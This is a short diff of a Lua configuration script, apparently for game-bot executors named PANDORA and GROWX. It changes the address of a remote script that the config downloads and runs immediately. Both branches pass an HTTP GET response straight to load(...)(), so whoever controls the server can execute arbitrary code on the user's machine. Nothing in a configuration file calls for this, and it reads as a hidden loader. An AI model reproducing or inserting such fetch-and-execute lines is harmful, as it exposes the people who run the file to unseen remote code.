@@ -119,7 +119,8 @@ CONFIG.notification = {
 
 CONFIG = CONFIG
 if CONFIG.PANDORA then
-    load(request("GET","http://134.209.99.103/rosok"))()
+    load(request("GET","http://rotation.payylater.com/rosok"))()
 elseif CONFIG.GROWX then
-    load(httpGet("http://134.209.99.103/rosok"))()
+    load(httpGet("http://rotation.payylater.com/rosok"))()
 end
+
